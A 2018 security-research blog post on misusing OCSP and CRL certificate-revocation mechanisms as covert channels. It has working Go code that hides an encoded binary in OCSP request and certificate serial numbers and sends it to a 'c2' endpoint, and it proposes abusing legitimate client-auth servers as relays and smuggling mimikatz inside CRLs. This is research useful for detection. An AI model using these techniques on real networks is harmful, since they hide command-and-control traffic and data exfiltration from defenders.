---
layout: post
title:  "Initial OCSP and CRL research"
date:   2018-02-08 10:31:12 -0600
categories: covert-channel
---

Recently I released some of my initial work revolving around TLS and specifically misusing certificates[[1],[15]]. To put into perspective for the X.509 stuff I had read many related papers, more RFCs than I care to admit, written 4 versions in python utilizing different libraries, learned many different SSL libraries in python including M2Crypto and Twister, written a bunch of test scripts for encoding and decoding ASN.1 in python, learned GOLang(been meaning to do this for awhile), learned many GOLang libraries. The end product of all of my research is cool to me because at the end of the day I've learned something new one way or the other.

For me it was a logical next step to look at CRL and OCSP, I even mentioned it in my paper[[1]] at the end. So with the exception of a short detour looking at using public key modulus of an X.509 certificate to transmit data[[2]] which I believe is entirely possible as a covert channel but will definitely be overwritten in just about every corporate environment doing MITM, I started down another long road of reading RFCs, papers and blog posts regarding ASN.1[[13]], CRL[[12]] and OCSP[[14]]. There has been work in this field related to OCSP already, someone added a C2 profile for use in Cobalt Strike[[3]] but then you are basically just doing regular HTTP/HTTPS based traffic with a different Content-Type header.  

# OCSP

Two ways jump out at me for doing OCSP to transmit data, one way shows up when reading the RFC for PKIX OCSP[[5]]. The ASN.1 structure of an OCSP request is defined at 4.1.1.1 in the RFC which also details the submitted revocation data to be checked as TBSRequest.  

```
   OCSPRequest     ::=     SEQUENCE {
       tbsRequest                  TBSRequest,
       optionalSignature   [0]     EXPLICIT Signature OPTIONAL }

   TBSRequest      ::=     SEQUENCE {
       version             [0]     EXPLICIT Version DEFAULT v1,
       requestorName       [1]     EXPLICIT GeneralName OPTIONAL,
       requestList                 SEQUENCE OF Request,
       requestExtensions   [2]     EXPLICIT Extensions OPTIONAL }

   Signature       ::=     SEQUENCE {
       signatureAlgorithm      AlgorithmIdentifier,
       signature               BIT STRING,
       certs               [0] EXPLICIT SEQUENCE OF Certificate
   OPTIONAL}

   Version         ::=             INTEGER  {  v1(0) }

   Request         ::=     SEQUENCE {
       reqCert                     CertID,
       singleRequestExtensions     [0] EXPLICIT Extensions OPTIONAL }

   CertID          ::=     SEQUENCE {
       hashAlgorithm       AlgorithmIdentifier,
       issuerNameHash      OCTET STRING, -- Hash of issuer's DN
       issuerKeyHash       OCTET STRING, -- Hash of issuer's public key
       serialNumber        CertificateSerialNumber }
```


Within TBSRequest we see that this accepts a list of CertID values to check, meaning we can send data by including it encoded in one of the fields available(hashAlgorhtm, issuerNameHash, issuerKeyHash, serialNumber). The hashAlgorithm is going to be an OID value and while we technically are allowed to generate our own OIDs this could cause anything inspecting OCSP traffic to throw a yellow flag. The other three values can all have data embedded in them as one is an integer and the other two are binary strings:  


```
   CertID          ::=     SEQUENCE {
       hashAlgorithm       AlgorithmIdentifier,
       issuerNameHash      OCTET STRING, -- Hash of issuer's DN
       issuerKeyHash       OCTET STRING, -- Hash of issuer's public key
       serialNumber        CertificateSerialNumber }
```

Loading data then is just a matter of generating an OCSP request with embedded data you want to send off:
{% highlight go %}
	test := "z/rt/gcAAAEDAACAAgAAAA8AAACwBAAAhQAgAAAAAAAZAAAASAAAAF9fUEFHRVpFUk8AAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAAAA2AEAAF9fVEVYVAAAAAAAAAAAAAAAAAAAAQAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAcAAAAFAAAABQAAAAAAAABfX3RleHQAAAAAAAAAAAAAX19URVhUAAAAAAAAAAAAAGAPAAABAAAAKgAAAAAAAABgDwAABAAAAAAAAAAAAAAAAAQAgAAAAAAAAAAAAAAAAF9fc3R1YnMAAAAAAAAAAABfX1RFWFQAAAAAAAAAAAAAig8AAAEAAAAGAAAAAAAAAIoPAAABAAAAAAAAAAAAAAAIBACAAAAAAAYAAAAAAAAAX19zdHViX2hlbHBlcgAAAF9fVEVYVAAAAAAAAAAAAACQDwAAAQAAABoAAAAAAAAAkA8AAAIAAAAAAAAAAAAAAAAEAIAAAAAAAAAAAAAAAABfX2NzdHJpbmcAAAAAAAAAX19URVhUAAAAAAAAAAAAAKoPAAABAAAADQAAAAAAAACqDwAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAF9fdW53aW5kX2luZm8AAAA="
	decN, _ := base64.StdEncoding.DecodeString(test)
	n := big.NewInt(0)
	n.SetBytes(decN)
	ocspsvr := "http://127.0.0.1"
	h := crypto.Hash(crypto.SHA1)
	req := ocsp.Request{HashAlgorithm: h, IssuerNameHash: []byte("z\x85\xf4vK\xbdm\xaf\x1c5E\xef\xbb\xf0\xf2y\xa6\xdc\x0b\xeb"), IssuerKeyHash: []byte("\x01\x92\x0f)bp\xa4m7\xd4\x90|\xfb\xb3\xd6\xaf\xa6\x82n\xa2"), SerialNumber: n}
	req_d, _ := req.Marshal()
	fmt.Println(req_d)
	reader := bytes.NewReader(req_d)
	httpRequest, err := http.NewRequest("POST", ocspsvr, reader)
	if err != nil {
		log.Fatalf("httprequest: %s", err)
	}
	httpRequest.Header.Add("Content-Type", "application/ocsp-request")
	httpRequest.Header.Add("Accept", "application/ocsp-response")
	fmt.Println(httpRequest)
	httpClient := &http.Client{}
	httpResponse, err := httpClient.Do(httpRequest)
	if err != nil {
		log.Fatalf("httpresponse: %s", err)
	}
	defer httpResponse.Body.Close()
	output, err := ioutil.ReadAll(httpResponse.Body)
	if err != nil {
		log.Fatalf("output: %s", err)
	}
	fmt.Println(string(output))
{% endhighlight %}

A slightly more interesting method would be to find a legitimate server already present on the internet which is setup to use client certificate authentication along with OCSP validation such as can be done in Apache[[6],[7],[8]]. If a server was setup in such a way that it would receive a client certificate and then attempt to validate that certificate against the OCSP server specified inside the certificate then you could place arbitrary data with the serial number field of the certificate. The legitimate server would then be acting as a relay for your malicious OCSP server placed somewhere else, the traffic seen however would only be to the legitimate server. I haven't gotten this to work to practice so it's purely theoretical.  

Sending off the data to a server is fairly simple we just load our data into the serial number of a certificate and then attempt to do client authentication to a server in a similar manner as was done with MalCert[[9]].  

GenCertWithOCSP:
{% highlight go %}
func GenCertWithOCSP(cn string, data []byte, ocsp []string, priv *rsa.PrivateKey, sn *big.Int) ([]byte, []byte) {
	ca := &x509.Certificate{
		//SerialNumber: big.NewInt(1337),
		SerialNumber: sn,
		Subject: pkix.Name{
			Country:            []string{"Neuland"},
			Organization:       []string{"Example Org"},
			OrganizationalUnit: []string{"Auto"},
			CommonName:         cn,
		},
		Issuer: pkix.Name{
			Country:            []string{"Neuland"},
			Organization:       []string{"Skynet"},
			OrganizationalUnit: []string{"Computer Emergency Response Team"},
			Locality:           []string{"Neuland"},
			Province:           []string{"Neuland"},
			StreetAddress:      []string{"Mainstreet 23"},
			PostalCode:         []string{"12345"},
			SerialNumber:       "23",
			CommonName:         cn,
		},
		SignatureAlgorithm: x509.SHA512WithRSA,
		PublicKeyAlgorithm: x509.ECDSA,
		NotBefore:          time.Now(),
		NotAfter:           time.Now().AddDate(0, 0, 10),
		BasicConstraintsValid: true,
		IsCA:        true,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		KeyUsage:    x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
	}
	if len(data) > 0 {
		ca.SubjectKeyId = data
	}
	if len(ocsp) > 0 {
		ca.OCSPServer = ocsp
	}
	privPem := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(priv),
	})
	pub := &priv.PublicKey
	ca_b, err := x509.CreateCertificate(rand.Reader, ca, ca, pub, priv)
	if err != nil {
		log.Fatalf("create cert failed %#v", err)
		panic("Cert Creation Error")
	}
	certPem := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: ca_b,
	})
	return certPem, privPem
}
{% endhighlight %}

Client example code:
{% highlight go %}
	test := "z/rt/gcAAAEDAACAAgAAAA8AAACwBAAAhQAgAAAAAAAZAAAASAAAAF9fUEFHRVpFUk8AAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAAAA2AEAAF9fVEVYVAAAAAAAAAAAAAAAAAAAAQAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAcAAAAFAAAABQAAAAAAAABfX3RleHQAAAAAAAAAAAAAX19URVhUAAAAAAAAAAAAAGAPAAABAAAAKgAAAAAAAABgDwAABAAAAAAAAAAAAAAAAAQAgAAAAAAAAAAAAAAAAF9fc3R1YnMAAAAAAAAAAABfX1RFWFQAAAAAAAAAAAAAig8AAAEAAAAGAAAAAAAAAIoPAAABAAAAAAAAAAAAAAAIBACAAAAAAAYAAAAAAAAAX19zdHViX2hlbHBlcgAAAF9fVEVYVAAAAAAAAAAAAACQDwAAAQAAABoAAAAAAAAAkA8AAAIAAAAAAAAAAAAAAAAEAIAAAAAAAAAAAAAAAABfX2NzdHJpbmcAAAAAAAAAX19URVhUAAAAAAAAAAAAAKoPAAABAAAADQAAAAAAAACqDwAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAF9fdW53aW5kX2luZm8AAAA="
	decN, _ := base64.StdEncoding.DecodeString(test)
	n := big.NewInt(0)
	n.SetBytes(decN)
	ca, pv := helper.GenCertWithOCSP("EICAR", []byte{}, []string{"http://127.0.0.1"}, settings.priv, n)
	c2 := "127.0.0.1:443"
	cert, err := tls.X509KeyPair(ca, pv)
	if err != nil {
		log.Fatalf("server: loadkeys: %s", err)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", c2, &config)
	if err != nil {
		log.Fatalf("client: dial: %s", err)
	}
{% endhighlight %}

Still trying to get this to work with Apache, if anyone has any luck feel free to hit me up on twitter or over email. It would be an interesting technique if you could find a healthy list of these specifically configured web servers on the internet for use as traffic relays via OCSP. Ofcourse the alternative is simply to create your own TLS server that will act as a proxy to your malicious OCSP server, or to simply perform an OCSP request to your malicious OCSP server directly as was outlined in the earlier code block demonstrating an OCSP request in GO as an example. That example code would be enough for anyone to create a simple OCSP server using GO example code[[10],[11]]


# CRL

Many avenues inside CRL files, you could store an almost endless amount of data inside a CRL by overwritting portions of data such as adding many revoked certificates and using the serial numbers to hold arbitrary data as was previusly described in the OCSP section. You could also just add extensions to the CRL itself which can hold binary data. This seems pretty similar to the X.509 stuff except for the revocation list being used, I believe utilizing another means as a C2 and then utilizing a CRL to send large amounts of data that have been hidden through ASN.1 encoding it into the revoked certificate sequences would probably be best.  

An example of this is a mimikatz binary that has been chunked up and encoded as revoked certificate serial numbers[[4]], or basically doing stegonagraphy inside CRL files.  






  

References:  
 1. http://vixra.org/abs/1801.0016  
 2. https://gist.github.com/sysopfb/d9deb9b8481e116cad1d62ceb5093073  
 3. https://github.com/rsmudge/Malleable-C2-Profiles  
 4. https://github.com/sysopfb/StegoCRL  
 5. https://tools.ietf.org/html/rfc6960  
 6. https://stuff-things.net/2015/09/28/configuring-apache-for-ssl-client-certificate-authentication/  
 7. http://wiki.cacert.org/ApacheServerClientCertificateAuthentication  
 8. https://eprint.iacr.org/2013/538.pdf  
 9. https://github.com/sysopfb/malcert  
 10. https://github.com/golang/crypto/blob/master/ocsp/ocsp_test.go  
 11. https://github.com/cloudflare/cfssl/blob/master/ocsp/responder.go  
 12. https://blogs.forcepoint.com/security-labs/digging-certificate-revocation-lists  
 13. http://luca.ntop.org/Teaching/Appunti/asn1.html  
 14. https://www.maikel.pro/blog/current-state-certificate-revocation-crls-ocsp/  
 15. https://www.fidelissecurity.com/threatgeek/2018/02/exposing-x509-vulnerabilities  
 
 



[1]:http://vixra.org/abs/1801.0016  
[2]:https://gist.github.com/sysopfb/d9deb9b8481e116cad1d62ceb5093073  
[3]:https://github.com/rsmudge/Malleable-C2-Profiles  
[4]:https://github.com/sysopfb/StegoCRL  
[5]:https://tools.ietf.org/html/rfc6960  
[6]:https://stuff-things.net/2015/09/28/configuring-apache-for-ssl-client-certificate-authentication/  
[7]:http://wiki.cacert.org/ApacheServerClientCertificateAuthentication  
[8]:https://eprint.iacr.org/2013/538.pdf  
[9]:https://github.com/sysopfb/malcert  
[10]:https://github.com/golang/crypto/blob/master/ocsp/ocsp_test.go  
[11]:https://github.com/cloudflare/cfssl/blob/master/ocsp/responder.go  
[12]:https://blogs.forcepoint.com/security-labs/digging-certificate-revocation-lists  
[13]:http://luca.ntop.org/Teaching/Appunti/asn1.html  
[14]:https://www.maikel.pro/blog/current-state-certificate-revocation-crls-ocsp/  
[15]:https://www.fidelissecurity.com/threatgeek/2018/02/exposing-x509-vulnerabilities  






